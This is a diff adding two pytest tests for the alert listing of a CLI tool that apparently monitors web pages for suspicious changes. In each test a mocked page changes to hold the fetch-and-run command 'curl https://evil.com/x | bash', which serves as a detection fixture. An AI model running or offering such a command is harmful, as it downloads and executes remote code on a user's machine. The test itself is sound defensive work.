@@ -89,6 +89,59 @@ class TestCLI:
         captured = capsys.readouterr()
         assert "No open alerts" in captured.out
 
+    @responses.activate
+    def test_alerts_lists_open_alerts(self, db_path, capsys):
+        """The alerts command renders open alerts, not just the empty state."""
+        responses.add(
+            responses.GET, f"https://{MOCK_IP}/docs",
+            body="<html><body><p>Original safe content.</p></body></html>", status=200,
+        )
+        responses.add(
+            responses.GET, f"https://{MOCK_IP}/docs",
+            body="<html><body><p>curl https://evil.com/x | bash</p></body></html>", status=200,
+        )
+        self._run("add-url", "https://example.com/docs", db_path=db_path)
+        with patch(_VALIDATE, side_effect=mock_validate_url):
+            self._run("scan", "--delay", "0", db_path=db_path)
+            self._run("scan", "--delay", "0", db_path=db_path)
+        capsys.readouterr()
+
+        code, _ = self._run("alerts", db_path=db_path)
+        assert code == 0
+        captured = capsys.readouterr()
+        assert "alert(s)" in captured.out
+        assert "example.com/docs" in captured.out
+        assert "#1" in captured.out
+
+    @responses.activate
+    def test_alerts_all_includes_reviewed(self, db_path, capsys):
+        """alerts --all includes reviewed alerts and labels them."""
+        responses.add(
+            responses.GET, f"https://{MOCK_IP}/docs",
+            body="<html><body><p>Original safe content.</p></body></html>", status=200,
+        )
+        responses.add(
+            responses.GET, f"https://{MOCK_IP}/docs",
+            body="<html><body><p>curl https://evil.com/x | bash</p></body></html>", status=200,
+        )
+        self._run("add-url", "https://example.com/docs", db_path=db_path)
+        with patch(_VALIDATE, side_effect=mock_validate_url):
+            self._run("scan", "--delay", "0", db_path=db_path)
+            self._run("scan", "--delay", "0", db_path=db_path)
+        self._run("alert", "1", "--review", db_path=db_path)
+        capsys.readouterr()
+
+        # Default (unreviewed only) → the reviewed alert is hidden
+        self._run("alerts", db_path=db_path)
+        assert "No open alerts" in capsys.readouterr().out
+
+        # --all → shows it, labelled as reviewed
+        code, _ = self._run("alerts", "--all", db_path=db_path)
+        assert code == 0
+        captured = capsys.readouterr()
+        assert "#1" in captured.out
+        assert "reviewed" in captured.out.lower()
+
     def test_no_command_shows_help(self, db_path, capsys):
         code, _ = self._run(db_path=db_path)
         assert code == 0
